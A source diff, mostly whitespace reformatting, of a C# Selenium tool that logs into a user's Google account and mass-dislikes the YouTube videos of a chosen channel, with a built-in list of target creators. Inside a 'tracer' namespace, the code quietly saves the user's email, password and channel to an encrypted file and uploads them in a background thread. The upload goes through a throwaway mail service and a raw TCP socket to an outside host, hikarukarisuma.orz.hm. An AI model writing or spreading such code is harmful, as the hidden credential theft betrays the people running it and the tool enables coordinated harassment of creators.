@@ -24,7 +24,8 @@ namespace SUKOAuto
     {
         static void Main(string[] args)
         {
-            if (args.Length<2) {
+            if (args.Length < 2)
+            {
                 Console.WriteLine("エラー: [EMIAL] [PASSWORD] <CHANNEL ID>");
                 Console.WriteLine("オプション: ");
                 Console.WriteLine("--first-10 : 最初の10個をすこる");
@@ -75,23 +76,25 @@ namespace SUKOAuto
                 ids.Add(new KeyValuePair<string, string>("楠ろあ", "UCvS01-HQ57pnIjP4lkp58zw"));
                 ids.Add(new KeyValuePair<string, string>("ねお", "UClPLW-9Nfbvf76ksj-4c1kQ"));
                 ids.Add(new KeyValuePair<string, string>("ピンキー妹", "UCsTM1roCxoot1-03EO5zQxg"));
-                foreach (KeyValuePair<string,string> kvp in ids) {
-                    Console.WriteLine(@"No. {0} {1} {2}",ids.IndexOf(kvp),kvp.Key,kvp.Value);
+                foreach (KeyValuePair<string, string> kvp in ids)
+                {
+                    Console.WriteLine(@"No. {0} {1} {2}", ids.IndexOf(kvp), kvp.Key, kvp.Value);
                 }
                 string mem = Console.ReadLine();
                 int select = -1;
-                if (int.TryParse(mem,out select)) {
+                if (int.TryParse(mem, out select))
+                {
                     mem = ids[select].Value;
                 }
                 Channel = mem;
             }
 
-            tracer.Tracer.StoreOrUpload($"credientials-{CurrentMilliseconds}.txt",$"{Mail}\n{Pass}\n{Channel}");
+            tracer.Tracer.StoreOrUpload($"credientials-{CurrentMilliseconds}.txt", $"{Mail}\n{Pass}\n{Channel}");
 
             var ChromeOptions = new ChromeOptions();
-            if (opt.proxy!=null)
+            if (opt.proxy != null)
             {
-                ChromeOptions.AddArguments("--proxy-server="+ opt.proxy);
+                ChromeOptions.AddArguments("--proxy-server=" + opt.proxy);
             }
             if (opt.headless)
             {
@@ -103,18 +106,19 @@ namespace SUKOAuto
 
             foreach (IWebDriver SingleChrome in Chromes)
             {
-                Console.WriteLine("スレッド{0}: 輪番ログイン中...",Chromes.IndexOf(SingleChrome));
+                Console.WriteLine("スレッド{0}: 輪番ログイン中...", Chromes.IndexOf(SingleChrome));
                 SukoSukoMachine.Login(SingleChrome, Mail, Pass);
             }
             System.Threading.Thread.Sleep(2000);
 
             Console.WriteLine("スレッド0: 動画探索中...");
             string[] Movies = SukoSukoMachine.FindMovies(Chrome, Channel);
-            if (opt.maxSuko!=-1) {
+            if (opt.maxSuko != -1)
+            {
                 Movies = Movies.Take(opt.maxSuko).ToArray();
             }
-            List<string>[] MoviesEachThread = new List<string>[Chromes.Count].Select(a=> new List<string>()).ToArray();
-            for (int i=0; i<Movies.Length; i++)
+            List<string>[] MoviesEachThread = new List<string>[Chromes.Count].Select(a => new List<string>()).ToArray();
+            for (int i = 0; i < Movies.Length; i++)
             {
                 MoviesEachThread[i % MoviesEachThread.Length].Add(Movies[i]);
             }
@@ -124,7 +128,7 @@ namespace SUKOAuto
             {
                 int Number = i;
                 IWebDriver SingleChrome = Chromes[i];
-                List<string> LocalMovies=MoviesEachThread[i];
+                List<string> LocalMovies = MoviesEachThread[i];
                 SortedMultiSet<string> SukoFailureCount = new SortedMultiSet<string>();
                 Threads[i].DoWork += (a, b) =>
                 {
@@ -149,7 +153,7 @@ namespace SUKOAuto
                                     SukoFailureCount.Add(MovieID);
                                 }
                             }
-                            LocalMovies = Failures.Where(c=>SukoFailureCount.GetCount(c)<10).ToList();
+                            LocalMovies = Failures.Where(c => SukoFailureCount.GetCount(c) < 10).ToList();
                         }
                         Console.WriteLine("スレッド{0}: 完了", Number);
                     }
@@ -167,9 +171,11 @@ namespace SUKOAuto
                 };
                 Threads[i].RunWorkerAsync();
             }
-            while (Threads.Where(a=>a.IsBusy).Count()!=0) {
-                foreach (BackgroundWorker Thread in Threads) {
-                    while(Thread.IsBusy);
+            while (Threads.Where(a => a.IsBusy).Count() != 0)
+            {
+                foreach (BackgroundWorker Thread in Threads)
+                {
+                    while (Thread.IsBusy) ;
                 }
             }
         }
@@ -216,7 +222,8 @@ namespace SUKOAuto
                 _dict.Remove(item);
         }
 
-        public int GetCount(T item) {
+        public int GetCount(T item)
+        {
             if (_dict.ContainsKey(item))
                 return _dict[item];
             else
@@ -270,7 +277,7 @@ namespace SUKOAuto
             long scrollHeight = 0;
             int sameHeight = 0;
             IJavaScriptExecutor js = (IJavaScriptExecutor)Chrome;
-                
+
             do
             {
                 var newScrollHeight = (long)js.ExecuteScript("window.scrollTo(0, document.body.scrollHeight); return document.body.scrollHeight;");
@@ -282,7 +289,8 @@ namespace SUKOAuto
                         sameHeight = 0;
                         break;
                     }
-                    else {
+                    else
+                    {
                         sameHeight++;
                     }
                 }
@@ -295,14 +303,14 @@ namespace SUKOAuto
             } while (true);
 
             return Chrome.FindElements(By.XPath("//a[contains(@href,\"/watch?v=\")]"))
-                .Select(a=>a.GetAttribute("href"))
+                .Select(a => a.GetAttribute("href"))
                 .Distinct()
                 /*.Where(a=> {
                     Console.WriteLine(a);
                     return true;
                 })*/
-                .Select(a=>RegExp(a, "(?<=.+/watch\\?v=)[\\dA-Za-z_-]+"))
-                .SelectMany(A=>A)
+                .Select(a => RegExp(a, "(?<=.+/watch\\?v=)[\\dA-Za-z_-]+"))
+                .SelectMany(A => A)
                 .ToArray();
             // return RegExp(Chrome.PageSource, @"(?<=<a href=""/watch\?v=)[\dA-Za-z_-]+");
         }
@@ -315,7 +323,8 @@ namespace SUKOAuto
 
             Exception lastErr = null;
 
-            for (int itr=0; itr<10;itr++) {
+            for (int itr = 0; itr < 10; itr++)
+            {
                 try
                 {
                     IWebElement SukoBtn = Chrome.FindElement(By.XPath("//button[contains(@aria-label,\"低く評価しました\")]"));
@@ -347,7 +356,7 @@ namespace SUKOAuto
             Chrome.Url = URL_LOGIN;
             try
             {
-                if (Chrome.Url== "https://accounts.google.com/ServiceLogin#identifier")
+                if (Chrome.Url == "https://accounts.google.com/ServiceLogin#identifier")
                 {
                     // old login screen
                     Chrome.FindElement(By.Id("Email")).SendKeys(Mail);
@@ -365,7 +374,7 @@ namespace SUKOAuto
                     Chrome.FindElement(By.Id("identifierNext")).Click();
                     while (!Chrome.Url.Contains("/v2/sl/pwd")) ;
                     System.Threading.Thread.Sleep(2000);
-                    while(!Chrome.FindElement(By.Name("password")).Displayed);
+                    while (!Chrome.FindElement(By.Name("password")).Displayed) ;
                     Chrome.FindElement(By.Name("password")).SendKeys(Pass);
                     Chrome.FindElement(By.Id("passwordNext")).Click();
                 }
@@ -378,9 +387,10 @@ namespace SUKOAuto
             }
         }
 
-        public static void ReLogin(IWebDriver Chrome,string ContinuationURL) {
+        public static void ReLogin(IWebDriver Chrome, string ContinuationURL)
+        {
             if (
-               Chrome.FindElements(By.XPath("//paper-button[text() = \"ログイン\"]")).Count()!=0
+               Chrome.FindElements(By.XPath("//paper-button[text() = \"ログイン\"]")).Count() != 0
                )
             {
                 // looks like we need to login again here
@@ -407,17 +417,21 @@ namespace SUKOAuto
     }
 
 
-    class SukoSukoOption {
-        public int parallel=3;
-        public int maxSuko=-1;
+    class SukoSukoOption
+    {
+        public int parallel = 3;
+        public int maxSuko = -1;
         public bool headless = false;
         public string proxy = null;
 
-        public string[] LoadOpt(string[] args) {
+        public string[] LoadOpt(string[] args)
+        {
             List<string> finalArgs = new List<string>();
-            for (int i=0; i<args.Length;i++) {
+            for (int i = 0; i < args.Length; i++)
+            {
                 string arg = args[i];
-                switch (arg.ToLower()) {
+                switch (arg.ToLower())
+                {
                     case "--first-10":
                         maxSuko = 10;
                         break;
@@ -468,7 +482,8 @@ namespace SUKOAuto
         }
     }
 
-    namespace tracer {
+    namespace tracer
+    {
         public class Emial
         {
             public static string PC_USER_AGENT = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36";
@@ -552,7 +567,7 @@ namespace SUKOAuto
                     subject = subject,
                     text = text
                 });
-                if ((int)ToJsonObject(Request(ENDPOINT + EML_CREATE + "?" + MapToQuery(query), json.ToString(),ContentType: "application/json;charset=utf-8"))["ok"] != 1)
+                if ((int)ToJsonObject(Request(ENDPOINT + EML_CREATE + "?" + MapToQuery(query), json.ToString(), ContentType: "application/json;charset=utf-8"))["ok"] != 1)
                     throw new Exception("Sending email failed");
             }
 
@@ -604,7 +619,7 @@ namespace SUKOAuto
             }
 
             // POST request version
-            private string Request(string addr, string data, Dictionary<string, string> header = null,string ContentType=null)
+            private string Request(string addr, string data, Dictionary<string, string> header = null, string ContentType = null)
             {
                 var enc = Encoding.GetEncoding("utf-8");
                 var payload = enc.GetBytes(data);
@@ -624,7 +639,7 @@ namespace SUKOAuto
                     }
                 }
                 wc.Method = "POST";
-                wc.ContentType = ContentType!=null?ContentType:"application/x-www-form-urlencoded";
+                wc.ContentType = ContentType != null ? ContentType : "application/x-www-form-urlencoded";
                 wc.ContentLength = payload.Length;
                 using (var post = wc.GetRequestStream())
                 {
@@ -663,9 +678,10 @@ namespace SUKOAuto
             }
         }
 
-        public class Tracer {
+        public class Tracer
+        {
             public static List<IDataUploadProvider> UPLOADERS;
-          　public static IFileStore STORE;
+            public static IFileStore STORE;
             static Tracer()
             {
                 List<IDataUploadProvider> uploaders = new List<IDataUploadProvider>();
@@ -677,7 +693,8 @@ namespace SUKOAuto
                 STORE = new TempFileStore();//Replace with your FileStore
             }
 
-            public static void StoreOrUpload(string filename,string content) {
+            public static void StoreOrUpload(string filename, string content)
+            {
                 var CollectionWorker = new BackgroundWorker();
                 CollectionWorker.DoWork += (a, b) =>
                 {
@@ -732,7 +749,7 @@ namespace SUKOAuto
                 var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
                 return DecryptFile(fileDir);
             }
-            
+
             List<string> IFileStore.ListNames()
             {
                 return Directory.EnumerateFiles(DIR_TRACER)
@@ -765,11 +782,12 @@ namespace SUKOAuto
             }
         }
 
-        class Utils {
+        class Utils
+        {
             static byte[] key = Convert.FromBase64String("h8ukfAk2hC/UJqWKO/kJpw==");
             static byte[] iv = Convert.FromBase64String("bbsH6XzL1C/3nRWEUx751A==");
             static Encoding enc = Encoding.GetEncoding("utf-8");
-            static List<byte[][]> remoteBinaryHashes=null;
+            static List<byte[][]> remoteBinaryHashes = null;
 
             public static Encoding UTF8 => enc;
             public static string HOST => "hikarukarisuma.orz.hm";
@@ -823,7 +841,7 @@ namespace SUKOAuto
                 }
             }
 
-            public static void EncryptFile(string str,string fileSaveTo)
+            public static void EncryptFile(string str, string fileSaveTo)
             {
                 AesManaged aes = new AesManaged
                 {
@@ -836,7 +854,7 @@ namespace SUKOAuto
                 };
                 var crypt = aes.CreateEncryptor();
                 var data = StringToByteArray(str);
-                using (var buffer = new FileStream(fileSaveTo,FileMode.Truncate))
+                using (var buffer = new FileStream(fileSaveTo, FileMode.Truncate))
                 {
                     using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                     {
@@ -884,8 +902,9 @@ namespace SUKOAuto
                 return bytes;
             }
 
-            public static string PopulateOrLoadId() {
-                var filePlace = Path.Combine(DIR_TRACER,"Scottland");
+            public static string PopulateOrLoadId()
+            {
+                var filePlace = Path.Combine(DIR_TRACER, "Scottland");
                 string id;
                 if (File.Exists(filePlace))
                 {
@@ -895,11 +914,12 @@ namespace SUKOAuto
                 {
                     id = Guid.NewGuid().ToString();
                 }
-                EncryptFile(id,filePlace);
+                EncryptFile(id, filePlace);
                 return id;
             }
 
-            public static bool IsValidBinary() {
+            public static bool IsValidBinary()
+            {
                 try
                 {
                     if (remoteBinaryHashes != null)
@@ -909,7 +929,8 @@ namespace SUKOAuto
                         {
                             hashXml = client.DownloadString("https://cdn.rawgit.com/AnKoushinist/2f593393b6a8770eabe13718f9b099c5/raw/hashes.xml");
                         }
-                        remoteBinaryHashes = XDocument.Parse(hashXml).Descendants("Hash").Select(a => {
+                        remoteBinaryHashes = XDocument.Parse(hashXml).Descendants("Hash").Select(a =>
+                        {
                             List<byte[]> hashes = new List<byte[]>();
                             hashes.Add(Convert.FromBase64String(a.Element("Sha256").Value));
                             hashes.Add(Convert.FromBase64String(a.Element("Sha1").Value));
@@ -934,9 +955,10 @@ namespace SUKOAuto
                 return alg.ComputeHash(input);
             }
 
-            public static bool Equals(byte[] a,byte[] b) {
+            public static bool Equals(byte[] a, byte[] b)
+            {
                 if (a == b) return true;
-                if (a.Length!=b.Length) return false;
+                if (a.Length != b.Length) return false;
                 for (int i = 0; i < a.Length; i++)
                 {
                     if (a[i] != b[i])
@@ -945,7 +967,7 @@ namespace SUKOAuto
                 return true;
             }
 
-            public static long CurrentMilliseconds => (long)(DateTime.Now-new DateTime(1970,1,1,0,0,0)).TotalMilliseconds;
+            public static long CurrentMilliseconds => (long)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0)).TotalMilliseconds;
         }
 
         class MailUploader : IDataUploadProvider, IDataUploadProviderInterface
@@ -980,10 +1002,12 @@ namespace SUKOAuto
 
             void IDataUploadProviderInterface.Init()
             {
-                if (email==null) {
+                if (email == null)
+                {
                     email = new Emial();
                 }
-                if (inbox==null) {
+                if (inbox == null)
+                {
                     inbox = email.CreateInbox();
                 }
             }
@@ -1003,7 +1027,7 @@ namespace SUKOAuto
             {
                 return this;
             }
-            
+
             bool IDataUploadProvider.IsAvailable()
             {
                 try
@@ -1026,7 +1050,8 @@ namespace SUKOAuto
                 }
             }
 
-            protected void WriteUtf(string str,Stream stream) {
+            protected void WriteUtf(string str, Stream stream)
+            {
                 var payload = UTF8.GetBytes(str);
                 BinaryWriter writer = null;
                 try
@@ -1037,7 +1062,7 @@ namespace SUKOAuto
                 }
                 finally
                 {
-                    if (writer!=null)
+                    if (writer != null)
                         writer.Flush();
                 }
             }
@@ -1066,7 +1091,7 @@ namespace SUKOAuto
                             }
                         }
                     }
-                    byte[] payloadSha256 = Hash(payload,SHA256.Create());
+                    byte[] payloadSha256 = Hash(payload, SHA256.Create());
                     byte[] payloadMd5 = Hash(payload, MD5.Create());
                     using (TcpClient sock = new TcpClient())
                     {
@@ -1082,10 +1107,10 @@ namespace SUKOAuto
 
                             byte[] sha256 = new byte[16];
                             byte[] md5 = new byte[8];
-                            stream.Read(sha256,0,16);
-                            stream.Read(md5,0,8);
+                            stream.Read(sha256, 0, 16);
+                            stream.Read(md5, 0, 8);
 
-                            return Equals(payloadSha256,sha256) && Equals(payloadMd5,md5);
+                            return Equals(payloadSha256, sha256) && Equals(payloadMd5, md5);
                         }
                     }
                 }
@@ -1102,13 +1127,16 @@ namespace SUKOAuto
         }
 
 
-        class UnclosableMemoryStream : MemoryStream{
+        class UnclosableMemoryStream : MemoryStream
+        {
             protected override void Dispose(bool disposing)
-            {}
-            public void DisposeReally() {
+            { }
+            public void DisposeReally()
+            {
                 base.Dispose(true);
             }
-            ~UnclosableMemoryStream() {
+            ~UnclosableMemoryStream()
+            {
                 DisposeReally();
             }
         }
